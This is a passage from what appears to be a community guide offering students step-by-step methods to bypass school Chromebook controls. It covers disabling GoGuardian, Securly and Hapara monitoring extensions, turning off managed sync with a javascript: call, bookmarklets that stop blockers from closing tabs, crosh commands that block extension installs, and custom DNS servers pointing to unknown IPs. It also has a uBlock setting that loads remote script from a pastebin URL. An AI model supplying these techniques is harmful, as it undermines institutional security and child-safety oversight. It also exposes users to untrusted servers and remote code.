4. Now visit `tinyurl.com/AddSession` or [this link](https://accounts.google.com/signin/v2/identifier?hl=en&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&flowName=GlifWebSignIn&flowEntry=AddSession)
5. Add your **SCHOOL** account back. It WILL NOT WORK if you add a home account back. This is just so you can still access Google Drive, YouTube, and any Google service.
6. All extensions should stop working.
7. Note that you must repeat this every time you restart or sign out.
8. If your Chrome version is `v112`, this exploit will no longer work, the bypass to this is listed further on. Visit`chrome://settings/resetProfileSettings` click current settings, and it'll open a blank page, on that page run 
```js
javascript:opener.chrome.send("TurnOffSync");
```
And visit `chrome://restart`.
`
**This was discovered by Zoroark**
</details>

<details>
<summary><b>Extention Inactivity hack</b> Inactive Extensions</summary>

1. First do the Esc+Refresh+Power

2. ctrl+d then enter

3. will give you some bullcrap about dev mode being blocked press enter then you will go to a newly restarted Chromebook

4. next add wifi-

5. then sign into your account

6. Immediately turn wifi off before extensions load

7. go to chrome://settings/signOut

8. click Turn off sync and personalization and then turn wifi back on and go to whatever site that is extension blocked.

1. Workaround for chrome://settings/signOut if patched: If the link gets patched and you no longer see the blue button, go to `chrome://settings/resetProfileSettings` and click current settings, it'll open a blank page, on that page run 
```js
javascript:opener.chrome.send("TurnOffSync");
```
2. Workaround for `chrome://settings/signOut` and `javascript:opener.chrome.send("TurnOffSync");` if both patched: Just go to `chrome://settings/syncSetup/advanced` and click 
Customize sync and then flip off the Extensions and Apps

Note: Before you do any of the method 4 tricks only do this at home so that way you don't have to worry about asking for the school wifi password.

</details>

<details>
<summary><b>New Temporarily Unblock Anything</b> Temperarily Unblock Any Website</summary>

**Might Be Patched on 115 And Above**

1. Go to the chrome-extension://Paste the blocker id here/manifest.json page.
2. Go to a new tab page and type in the URL Website you want to unblock don´t go into that website yet just leave it inside the URL Box.
3. Go back to chrome-extension://Paste the blocker id here/manifest.json now create a bookmark called E now click more and In the URL Box you put chrome://kill now save that bookmark.
4. Create another bookmark called D. Click more In the URL Box copy and paste  `javascript:(function () {window.onbeforeunload = function() { return 1; };})()`    Into that URL Box and save that bookmark.
5. Go back to chrome-extension://Paste the blocker id here/manifest.json page and now click bookmark B. Then quickly go back to the new tab page and click enter now quickly spam bookmark D like 2 or more times now there should be a pop-up called `Do you want to close this page?` click cancel now boom that website is unblocked until you turn off your Chromebook or until you exit out of that website then if that happens your gonna have to do all the steps again.

An easier way for step 2: instead of putting the URL in the new tab box go to chrome-extension://Paste the blocker id here/manifest.json page then click Bookmark E then go to a random website then use the `javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1))` Bookmarklet then spam Bookmark D two or more times then a pop up should appear quickly click cancel now boom all done.
  
Name of Bookmarklet > Unblock Website: `javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1))`

Note: Save `chrome-extension://Paste` the blocker id here/manifest.json as a bookmark so you don´t have to come back here and type in the URL thing.

IMPORTANT NOTE: if bookmarklets are blocked your screwed

</details>

<details>
<summary><b>Old Temporarily Unblock Anything</b> Temperarily Unblock Any Website</summary>

1. make a bookmark called tab close blocker now click more on the bottom left corner in that URL BOX put `javascript:(function () {window.onbeforeunload = function() { return 1; };})()`
2. go to a newtab page now go into the URL BOX on the top and put https://YOUR WEBSITE HERE do not click enter yet stay in that URL BOX.
3. do search+esc now that should open task manager if search+esc doesn't work then click the three dots on the top right now and scroll down until you find more tools click that and now find Task Manager click it now boom done with step 3.
4. find your blocker extension and click it now on the bottom right you should see a button called End process click it now quickly click the URL BOX on the new page and click enter now quickly spam the bookmark tab close blocker Now a pop up should come up it should have to buttons cancel and leave click cancel and boom done.
  IMPORTANT NOTE: if bookmarklets are blocked your screwed also if task manager or the End Process button for the task manager is blocked your double screwed.
  </details>
  
  <details>
  <summary><b>Incognito</b> Bypass Extensions</summary>
IP Server: Server 1. 52.207.185.90

1. Go to your settings
2. Click on the wifi your using rn then click it again.
3.  Scroll down until you see network once you see the option click it.
4. Scroll down until you find custom name servers now once you find the option click it.
5. Paste in the IP Server.
6. Now there should be a notification saying open a new tab click that and now you should be in a small window some instructions and there are 2 buttons click the yellow with black letters button and boom Incognito Mode is Unblocked.
One of the buttons are just a link in blue don´t click that one is just for tests
7. Go back to the network settings and change the custom name servers to automatic name servers.

Note: If your connection is slow if your school has more than one wifi then connect to the other wifi that might have a better connection.
If you close out of the Incognito Tab you will have to do all the steps again.
Cool Advanced Facts About Incognito Mode:
1. Bypass Extensions Aka Unblock All Websites.
2. Your History Is Hidden From Your School
</details>
<details>
<summary><b>Google System Method</b> Bypass Extensions</summary>
Unblocked Google

1. Go to `chrome://chrome-signin`
2. Click OK on the bottom right corner
3. In the Email text box put `google@d11.org`
4. Click `signin options`
5. Now click sign in with GitHub
6. Click the GitHub cat icon
7. In the search box on the top right type google and then click see more topics then you will see all the Google links click `www.google.com` now boom unblocked Google.

</details>
<details>
<summary><b>Quick View</b> Bypass Extensions</summary>
**QuickView is a universal web view exploit in Chrome OS that utilizes the QuickOffice component extension. This exploit lets you create login windows with arbitrary URLs, thus allowing you to load pages without any extensions.**
Go here and follow the instructions: https://quickview-exploit.pages.dev/
WARNING: If javascript:// is blocked then you can't perform this exploit

</details>

<details>
<summary><b>School Network Restriction Bypass</b> Bypass School Network Restrictions</summary>
IP Server 1: 8.8.8.8 in all boxes
IP Server 2: 1.1.1.1 in the first box and 1.0.0.1 in the second box the third and fourth boxes stay 0.0.0.0

1. Go to your settings
2. Click on the wifi you using right now then click it again.
3.  Scroll down until you see the network once you see the option click it.
4. Scroll down until you find custom name servers once you find the option click it.
5. Paste in one of the IP Servers.
Note: If IP Server 1 doesn't work then use IP Server 2 if IP Server 2 doesn't work then try using IP Server 1 if they both don't work you're screwed

</details>

<details>
<summary><b>OP Crosh</b> Disable extensions with crosh</summary>

1. Back up any data you want before the powerwash.
2. If you're doing the second variation, note down any extension IDs. You may also want to do this if you intend on disabling all extensions since sometimes that will fail and require you to specify each extension you want to disable.
3. Powerwash by attempting to enable developer mode. Instructions are available here: [this link](https://chromium.googlesource.com/chromiumos/docs/+/master/developer_mode.md#dev-mode)
4. Log into your Google account as normal, but immediately disable your internet right after you sign in.
5. You should be logged into your account, but without any extensions installed due to being offline.
Here the instructions are split, so follow the one for the method that you want to do.
 
Disable All Extensions:
1. Open up crosh by hitting ctr+alt+t.
2. Type in `vmc create-extra-disk --size 1 /home/chronos/user/Extensions`
3. Run that command.
4. If it fails with a "file exists" error, then you must individually specify each extension that you want to remove. Move to step 5 of the next section to do that.
5. Re-enable your internet, and no extensions should be installed.
 

Disable Specific Extensions:
1. Navigate to `chrome://extensions`.
2. Enable your internet, and immediately disable it when an extension is installed.
3. Assuming the installed extension was not one that you were trying to disable, move on to step 4. If it was, you'd have to powerwash to try again.
4. Open up crosh by hitting ctr+alt+t.
5. For each extension you want to disable, run this command: `vmc create-extra-disk --size 1 /home/chronos/user/Extensions/{extension_id}`
6. Each command should look something like this: `vmc create-extra-disk --size 1 /home/chronos/user/Extensions/cjpalhdlnbpafiamejdnhcphjbkeiagm`
7. Re-enable your internet, and if you typed/pasted in the extension IDs correctly, those specific extensions should be blocked from ever being installed.

Made by vk6

</details>

<details>
<summary><b>uBlock Origin</b> Run Code On Pages</summary>

If your school allows the uBlock Origin chrome extension, then running any javascript on pages is possible.

1. install [uBlock Origin](https://ublockorigin.com/)
2. Go to the extension's settings
3. Under the settings tab, check the "I am an advanced user" box and click on the cog icon (image 1)
4. Inside the advanced settings, change `userResourcesLocation` from unset to https://pastebin.com/raw/PPZ1T7uh (image 2)
5. In the custom filters tab of the settings, add `##+js(execute_script.js)` as a filter (image 3)
6. Now you can press ctr+alt+tilde (~) to run any js on the current page
7. If you want to run a bookmarklet, just paste in the javascript: URL and press enter on the popup

</details>

<details>
<summary><b>Incognito on Sign-In</b> Bypass Extensions/Unblocked Google Webview</summary>
Might work but idk if it will

IP Servers: Server 1. `52.207.185.90`
            Server 2. `158.111.114.159`

1. On the sign-in screen go to your Wi-Fi settings and click on the wifi you are using right now.
2. Then Scroll down until you see network once you see the option click it.
3. Scroll down until you find custom name servers once you find the option click it.
4. Paste in the IP Servers
5. Now on the network settings click the sign in and you should be in a small window with some instructions, there are 2 buttons click the blue link and boom unblocked webview of google.

Cool Facts About Incognito Mode:
1. No Extensions.
2. Your History Is Hidden From Your School*

*If your school does not have network logs or anything like that

</details>

<details>
<summary><b>chrome-signin webview</b> Yet another webview bypass</summary>
  
1. Go to `chrome://chrome-signin`
2. Click OK on the bottom right corner
3. In the Email text box put `google@d11.org`
4. Click `sign in options`
5. Now click sign in with GitHub
6. Click the GitHub logo
7. In the search box on the top right type Google and then click see more topics then you will see all the Google links click `www.google.com`
8. Profit

</details>

<details>
<summary><b>chrome-signin webview 2</b> Yet another webview bypass</summary>
Unblocked Google
  
1. Go to `chrome://chrome-signin`
2. Click OK on the bottom right corner
3. In the Email text box put `google@d11.org`
4. Click `signin options`
5. Now click sign in with GitHub
6 Click forgot password instead of the GitHub logo
7. Click docs
8. Scroll down
9. Click Ask the GitHub community
10. Search Google and click the hyperlink on the right

Credit to snail for finding this workaround.

</details>

<details>
<summary><b>Microsoft Labs</b> Bypass Extensions</summary>

YOU NEED A MICROSOFT ACCOUNT FOR THIS

Go to: <a href="https://learn.microsoft.com/en-us/training/modules/implement-common-integration-features-finance-ops/10-exercise-1">https://learn.microsoft.com/en-us/training/modules/implement-common-integration-features-finance-ops/10-exercise-1</a>

Next, sign into your Microsoft account, if it doesn't already, go back to that link

Then, hit Launch VM Mode

After it loads it's gonna ask for a password, the password is pass@word1 See images attached if needed

Then boom, you are done.

It's still kinda limited, like you can't go on Spotify sound doesn't output anyway and it, blocks random sites, but Discord 100% works

</details>

<details>
<summary><b>Quick View Exploit</b> Bypass Extensions</summary>

**QuickView is a universal webview exploit in Chrome OS that utilizes the QuickOffice component extension. This exploit lets you create login windows with arbitrary URLs, thus allowing you to load pages without any extensions.**

Go to <a href="https://quickview-exploit.pages.dev/">this link</a> and follow instructions

WARNING: If javascript:// is blocked then you can't preform this exploit

</details>

<details>
<summary><b>Buypass</b> Temporarily Unblock Websites</summary>

Exploit Made By <a href="https://buymeacoffee.com/bypassi">Bypassi#7037</a>

Here's the original GitHub repo of the buypass exploit: <a href="https://github.com/bypassiwastaken/buypass">Bypassi#7037's Buypass Exploit Github Repo</a>

Here's the original website of the buypass exploit: <a href="https://buypass.bypassi.com/">Bypassi#7037's Buypass Exploit Website</a>

Here are 3 alternative websites for the buypass exploit:

1. <a href="https://buypass.brandonprather.repl.co/">Buypass Exploit Repl Website</a>

2. <a href="https://buypass.glitch.me/">Buypass Exploit Glitch Website</a>

3. <a href="https://buypass.netlify.app/">Buypass Exploit netlify.app Website</a>

This Exploit Is Kinda Similar To The Quick View Exploit

</details>

<details>
<summary><b>[Webview] Testnav Exploit</b> Unblocked Webview for either google or a web browser</summary>

Step 1. Download Testnav off the webstore/playstore/or run as a kiosk app as some schools have it added as one
Step 2. Open it
Step 3. After opened it will probably bring you to the page were you select your consumer, click aimsweb/aimsweb plus
Step 4. After you click goto select your district in the bottom right corner of the page
Step 5. Select “STRATFORD FRIENDS SCHOOL” 
Step 6. Click the arrow to the right of the selection box
Step 7. Click sign in options
a) Click sign in with github
Step  8. Click the github logo at the top of the screen
Step 9. Click the three bars in the top right corner, then goto the search box and type in googleyay
Step 11. Scroll down until you see DerDer56/googleyay
Step 12. There's several links to choose from, but if there's a link you want that's not there click the Bypassi Redirect Tool
(Optional) Step 13. Type in the link you want to go on and click "Go To the URL"
Step 14. Click it and you have webview (unblocked browser)

</details>

<details>
<summary><b>Disable GoGuardian With The Chat</b> Disable GoGuardian [Unreliable]</summary>

1. wait until your teacher opens the chat window thingy

2. spam the x button until it stops re-opening

3. open the url `chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/manifest.json`

4. open `chrome://extensions/?id=haldlgldplgnggkjaafhelgiaglafanh`, and toggle the “allow access to file:// urls” switch

goguardian is now disabled and you can close both tabs 

made by carteeeee

</details>

<details>
<summary><b>Temporary Disable GoGuardian using a dns</b> Temporarily Disable GoGuardian</summary>

This method will remove GoGuardian from your Chromebook and keep it off, until you switch to a non-DNS wifi

1 - Powerwash your Chromebook

A) esc+refresh+power

B) then "ctrl"+"d" and then space or enter from then on

2 - Immediately after you add wifi to your Chromebook add the DNS record 158.101.114.159

A) Click on the menu at the bottom right of the screen and Click the Settings icon, go to your wifi, scroll to the bottom and open the networks dropdown, choose the "Custom name server" bubble, change the first box to 158.101.114.159

</details>

<details>
<summary><b>Insecurly</b> Disable Or Bypass Securly</summary>

**ONLY FOR SECURLY USERS**

Go to <a href="https://insecurly.bypassi.com/">this link</a> and follow instructions

If blocked then go cry in a corner
</details>

<details>
<summary><b>Chaos</b> A full bypass method for Hapara Highlights and Hapara Filter</summary>

**Devtools must not be blocked by policy to perform this exploit.**

Go to <a href="https://xlak.github.io/chaos/">this link</a> and follow instructions

If blocked then go cry in a corner
</details>

boop
